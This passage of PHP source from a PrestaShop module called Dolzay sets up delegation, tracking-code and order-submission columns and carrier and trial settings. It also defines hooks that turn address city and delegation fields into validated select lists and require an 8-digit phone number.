                        PrestaShopLogger::addLog("the query DROP_TABLE_SQL of the class $entity_class  was't executed very successfully", 3, null, 'Dolzay');
                        return false;
                    }

                }
            }
            return true;
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during dropping the tables : \n".
                                     "Error message : \n".$e->getMessage()."\n".
                                     "Traceback : \n".$e->getTraceAsString(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function add_delegation_to_the_address_format()
    {
        $id_country = (int)Configuration::get('PS_COUNTRY_DEFAULT');
        $address_format = $this->db->query("SELECT format FROM "._DB_PREFIX_."address_format WHERE id_country=".$id_country)->fetchColumn() ;
        $address_format = str_replace('city', 'city delegation', $address_format);
        $this->db->query("UPDATE "._DB_PREFIX_."address_format SET format='".$address_format."' WHERE id_country=".$id_country);
        return true ;
    
    }

    private function add_submitted_and_tracking_code_to_order(){
        try {
            // add the 'submitted' column
            $query = "IF NOT EXISTS (
                        SELECT * 
                        FROM INFORMATION_SCHEMA.COLUMNS
                        WHERE TABLE_NAME = '"._DB_PREFIX_ . \OrderCore::$definition['table']."' 
                            AND COLUMN_NAME = 'submitted'
                            AND TABLE_SCHEMA = DATABASE()
                    ) THEN
                        ALTER TABLE "._DB_PREFIX_ . \OrderCore::$definition['table']." ADD COLUMN submitted BOOLEAN DEFAULT FALSE;
                    END IF;" ;
            $this->db->query($query);

            // add the 'tracking_code' column
            $query = "IF NOT EXISTS (
                      SELECT * 
                        FROM INFORMATION_SCHEMA.COLUMNS
                        WHERE TABLE_NAME = '"._DB_PREFIX_ . \OrderCore::$definition['table']."' 
                        AND COLUMN_NAME = 'tracking_code'
                        AND TABLE_SCHEMA = DATABASE()
                    ) THEN
                        ALTER TABLE "._DB_PREFIX_ . \OrderCore::$definition['table']." ADD COLUMN tracking_code VARCHAR(255);
                    END IF;" ;
            $this->db->query($query);

            return true ;
        }
        catch (Error $e) {
            PrestaShopLogger::addLog("Error during adding delegation column: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function remove_delegation_from_the_address_format()
    {
        $id_country = (int)Configuration::get('PS_COUNTRY_DEFAULT');
        $address_format = $this->db->query("SELECT format FROM "._DB_PREFIX_."address_format WHERE id_country=".$id_country)->fetchColumn() ;
        $address_format = str_replace('delegation', '', $address_format);
        $this->db->query("UPDATE "._DB_PREFIX_."address_format SET format='".$address_format."' WHERE id_country=".$id_country);
        return true ;
    }

    private function add_delegation_to_address()
    {
        try {
            
            $query = "IF NOT EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS 
                    WHERE TABLE_NAME='" . _DB_PREFIX_ . \AddressCore::$definition['table'] . "' 
                    AND COLUMN_NAME='delegation' 
                    AND TABLE_SCHEMA=DATABASE()) 
                    THEN ALTER TABLE " . _DB_PREFIX_ . \AddressCore::$definition['table'] . " 
                    ADD COLUMN `delegation` varchar(255) DEFAULT NULL; 
                    END IF;";
            return $this->db->query($query) ;
        }
        catch (Error $e) {
            PrestaShopLogger::addLog("Error during adding delegation column: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function remove_delegation_from_address()
    {
        try {
            $query = "ALTER TABLE " . _DB_PREFIX_ . \AddressCore::$definition['table'] ." DROP COLUMN IF EXISTS `delegation`"; 
            return $this->db->query($query);
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error during removing delegation column: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }

    private function add_carriers(){
        $query = "INSERT INTO ". ApiCredentials::TABLE_NAME." () VALUES ();";
        $this->db->query($query);
        $api_crendentials_id = (int)$this->db->lastInsertId();
        
        $afex_logo = "/modules/" . $this->name. "/uploads/afex.png" ;
        $query = "INSERT INTO ". Carrier::TABLE_NAME." (`logo`,`name`,`api_credentials_id`) VALUES ('$afex_logo','Afex',".$api_crendentials_id.");";
        $this->db->query($query);
        return true ;
    }

    private function add_settings(){
        try {
            $expiration_date = new \DateTime();
            $expiration_date->modify('+14 days');
            $expiration_date = $expiration_date->format('Y-m-d H:i:s'); 
            $query = "INSERT INTO ".Settings::TABLE_NAME." (`license_type`,`post_submit_state_id`,`expiration_date`) VALUES ('free_trial',3,'$expiration_date');";
            return $this->db->query($query);
        }
        catch (Error $e) {
            PrestaShopLogger::addLog("Error during adding the settings table: " . $e->getMessage(), 3, null, 'Dolzay');
            return false;
        }
    }
    // END DEFINING THE PRIVATE METHODS

    public function hookAdditionalCustomerAddressFields($params)
    {
        // hook location : prestashop\classes\form\CustomerAddressFormatter.php line 150
        // goal : convert the city field to a select field and add the delegation field to the address form in the front office
        // notes : instead of returning new fields, we will modify the existing fields and return an empty array

        // convert the city field to a select field 
        $cityFormField = new FormField();
        $cityFormField->setType('select');
        $cityFormField->setName('city');
        $cityFormField->setLabel("City");
        $cityFormField->setRequired(true);
        $cityFormField->setAvailableValues(self::CITIES);
        $params['fields']['city'] = $cityFormField ;

        // convert the delegation field to a select field 
        $delgFormField = new FormField();
        $delgFormField->setName('delegation');
        $delgFormField->setType('select');
        $delgFormField->setRequired(true);
        $delgFormField->setLabel("Delegation");

        $params['fields']['delegation'] = $delgFormField ;

        // set the the phone number field to be required
        $params['fields']['phone']->setRequired(true);

        // return an empty array because we edited the existing fields instead of adding new ones
        return []  ;

    }

    public function hookActionValidateCustomerAddressForm($params)
    {
        // hook location : prestashop\classes\form\CustomerAddressForm.php line 109
        // goal : validate the city,delegation and phone fields of the address form in the front office
        
        $is_valid = true ;
        $form = $params['form'] ;
        

        // validate the city field and the delegation field 
        $city_field = $form->getField('city') ;
        $city_value = $city_field->getValue() ;

        $delegation_field = $form->getField('delegation') ;
        $delegation_value = $delegation_field->getValue() ;

        if (empty($city_value)) {
            $city_field->addError('Le champ "ville" est requis.');
            $is_valid = false ;
        } else if (!array_key_exists($city_value, self::CITIES)) {
            $city_field->addError("La ville choisie n'est pas valide");
            $is_valid = false ;
        }else if (empty($delegation_value)){
            $delegation_field->addError('Le champ "délégation" est requis.');
            $is_valid = false ;
        }
        else if(!in_array($delegation_value, self::CITIES_DELEGATIONS[$city_value])) {
            $delegation_field->addError("La délégation choisie n'est pas valide.");
            $is_valid = false ;
        }

        // validate the phone field
        $phone_field = $form->getField('phone') ;
        $phone_value = $phone_field->getValue() ;
        if (empty($phone_value)){
            $phone_field->addError('Le champ "téléphone" est requis.');
            $is_valid = false ;
        }
        else if(!preg_match('/^[0-9]{8}$/', $phone_value)) {
            $phone_field->addError('Le numéro de téléphone doit contenir exactement 8 chiffres.');
            $is_valid = false ;
        }
            
        return $is_valid ;
    }

    public function hookafterFillingEditAddressForm($params)
    {
        // hook location : dolzay\override\classes\form\AbstractForm.php line 32
        //goal : add the options of the delegation field based on the value of the city field in the address form of the front office
        // note : I didn’t handle the case of an invalid city value because the user knows their city and can select it from the valid options.
        //        This is different for the admin user, who doesn’t know the customer’s city—hence why I display it for them.
       
        $form = $params['form'] ;

        $city_field = $form->getField('city') ;
        $city_value = $city_field->getValue() ;

        $delegation_field = $form->getField('delegation') ;
        $delegation_options = (isset(self::CITIES_DELEGATIONS[$city_value])) ? self::CITIES_DELEGATIONS[$city_value] : array();
        $delegation_field->setAvailableValues($delegation_options);


    }

    public function hookDisplayHeader()
    {
        $name = $this->context->controller->php_self;
        try {
            if ($this->context->controller->php_self == 'address' || 
                $this->context->controller->php_self == 'order') {
                    
                $this->context->controller->addJS($this->_path.'views/js/delegation.js');

            }
        } catch (Error $e) {
            PrestaShopLogger::addLog("Error in hookDisplayFooter: " . $e->getMessage(), 3, null, 'Dolzay');
        }
    }

    public function hookActionAdminControllerSetMedia($params)
    {
        // add the js file that dynamically loads the delegation options based on the city value
        $controller = $this->context->controller ;
        //$action = $this->context->controller->action ;
        $controllerName = Tools::getValue('controller'); // Legacy controller name
        $action = Tools::getValue('action'); // Symfony action
        
        // Check if we are on the Customer Address Form page
        if ($controllerName === 'AdminAddresses' && ($action == "updateaddress" || $action == "addaddress" || $action == null)) {
            // Add your custom JS file
            $this->context->controller->addJS($this->_path . 'views/js/admin_delegation.js');
        }else if($controllerName == "AdminOrders" && $action == null){
        
            
            // get all the carriers and set them in js global var
            $db = DzDb::getInstance();
            Carrier::init($db) ;
            $carriers = Carrier::get_all();
            Media::addJsDef([
                'dz_carriers' => array_values($carriers),
            ]) ;


            $adminBaseUrl = $this->context->link->getAdminLink('AdminDashboard');
            Media::addJsDef([
                'adminBaseUrl' => $adminBaseUrl,
            ]);
            
            // add fontawesome
            $this->context->controller->addJS($this->_path . 'views/js/icons/font_awesome.js');
            // add the js and the css of the order submit process
            $this->context->controller->addCSS($this->_path . 'views/css/order_submit_process.css');
            $this->context->controller->addJS($this->_path . 'views/js/order_submit_process.js');
                
        }
    }


    public function hookActionCustomerAddressFormBuilderModifier($params){
        // located in prestashop\src\Core\Form\IdentifiableObject\Builder\FormBuilder.php at line : 138
        // the goal : is to convert the city filed into a select and to add the delegation field , also to 
        //            the options for both fields based on the db ($params['data']) or the request ($params['request']) in case of an invalide request in the 
        //            address form of the back-office

        $formBuilder = $params['form_builder'] ;
        $data = $params['data'] ;
        $request = $params['request'] ;
        $is_it_an_edit_form = isset($params['id']) ;
        
        $is_it_a_submit =  isset($request->request->all()['customer_address']) ;

        $existing_fields = $formBuilder->all() ;

        // remove all of the existing fields
        foreach ($existing_fields as $field_name => $field) {
            $formBuilder->remove($field_name) ;
        }

        // get the value of the city from the request if it's a submit request otherwise get it from db
        //$city_value = $is_it_a_submit ? $request->request->all()['customer_address']['city'] : $is_it_an_edit_form ? $data['city'] : null ;

        if ($is_it_a_submit) {
            $city_value = $request->request->all()['customer_address']['city'];
        } elseif ($is_it_an_edit_form) {
            $city_value = $data['city'];
        } else {
            $city_value = null;
        }

        // get the value of the delegation from the db if it's a rendering edit form request (not a submit request) to set it later in the form
        // because the value of the delegation doesn't show up in the form
        //$delegation_value = $is_it_an_edit_form && !$is_it_a_submit ? (new Address($params['id']))->delegation : null ;
        
        if ($is_it_a_submit) {
            $delegation_value = $request->request->all()['customer_address']['delegation'];
        } elseif ($is_it_an_edit_form) {
            $delegation_value = (new Address($params['id']))->delegation;
        } else {
            $delegation_value = null;
        }

        // prepare the delgation options based on the city value and the type of the form (edit or create)
        $delegation_options = isset(self::CITIES_DELEGATIONS[$city_value]) ? self::CITIES_DELEGATIONS[$city_value] : [] ;

        // add the fields in the right order
        foreach ($existing_fields as $field_name => $field) {
            // add the city and delegation
            if ($field_name === 'city') {
                $formBuilder->add('city', ChoiceType::class, [
                    'label' => 'Ville',
                    'required' => true,
                    'choices' => $is_it_an_edit_form && !isset(self::CITIES[$city_value]) ? array_merge([$city_value." (invalide)"=>$city_value],self::CITIES) : self::CITIES,
                    'placeholder' => 'Veuillez choisir une ville',
                    'constraints' => [
                        new NotBlank([
                            'message' => 'Ce champ est requis.'
                        ]),
                        new Choice([
                            'choices' => self::CITIES,
                            'message' => "La ville choisie n'est pas valide."
                        
                        ])
                    ]
                ]) 
                ->add('delegation', ChoiceType::class, [
                    'label' => 'Délégation',
                    'choices'  => $delegation_options,
                    'required' => true,
                    'placeholder' => 'Veuillez choisir une délégation',
                    'data' => $delegation_value, // set the value of the delegation in the rendering edit form request only 
                    'constraints' => [
                        new NotBlank([
                            'message' => 'Ce champ est requis.'
                        ]),
                        new Choice([
                            'choices' => $delegation_options,
                            'message' => "La délégation choisie n'est pas valide."
                        ])
                    ]
                ]) ;
            } else if($field_name == "phone"){
                $formBuilder->add('phone', TextType::class, [
                    'label' => 'Téléphone',
                    'required' => true,
                    'constraints' => [
                        new NotBlank([
                            'message' => 'Ce champ est requis.'
                        ]),
                        new Regex([
                            'pattern' => '/^[0-9]{8}$/',
                            'message' => 'Le numéro de téléphone doit contenir exactement 8 chiffres.'
                        ])
                    ]
                ]) ;
            }else{
                $formBuilder->add($field) ;
            }


        }

    }

    public function hookActionObjectAddressAddBefore($params)
    {
        // location prestashop\classes\ObjectModel.php at line  : 727
        // the goal : persisting the delegation in the db when adding a new address with the address form of the back-office
        $address = $params['object'];
        if (isset($_POST['customer_address']['delegation'])) {
            $address->delegation = Tools::getValue('customer_address')['delegation'];
        }
    }

    public function hookActionObjectAddressUpdateBefore($params)
    {
        // location prestashop\classes\ObjectModel.php at line  : 557
        // the goal : persisting the delegation in the db when updating an address with the address form of the back-office
        $address = $params['object'];
        if (isset($_POST['customer_address']['delegation'])) {
            $delegation = Tools::getValue('customer_address')['delegation'] ;
            $address->delegation = Tools::getValue('customer_address')['delegation'];
        }
    }

    public function hookActionAfterUpdateCustomerAddressFormHandler($params){
        // location C:\xampp\htdocs\prestashop\src\Core\Form\IdentifiableObject\Handler\FormHandler.php
        // the goal : because when i edit the address in the order detail page of the back-office a new address gets created
        //            without the delegation (for reason i didn't know) and it gets assigned as the delivery address of a the order i have to use this hook 
        //            to set the delegation for this new address )

        // check if the route is admin_order_addresses_edit
        if (isset($params['route']) && $params['route'] === "admin_order_addresses_edit") {
            
            $order  = new Order($params['id']) ;

            if (strpos($_SERVER['REQUEST_URI'], 'invoice') !== false) {
                // "invoice" exists in the pathname
                PrestaShopLogger::addLog("Invoice found in the request URI", 1, null, 'Dolzay');
            }
            
            $address = new Address(strpos($_SERVER['REQUEST_URI'], 'invoice') ? $order->id_address_invoice : $order->id_address_delivery) ;

            if ($address->delegation != $params['form_data']['delegation']) {
                $address->delegation = $params['form_data']['delegation'] ;
                $address->save() ;
            }

        }


    }

    public function hookActionAdminOrdersListingFieldsModifier($params)
    {
        // Add a custom group action
        $params['actions'][] = [
            'title' => 'Soumettre les commandes',
            'class' => 'btn btn-default',
        ];
    }
}
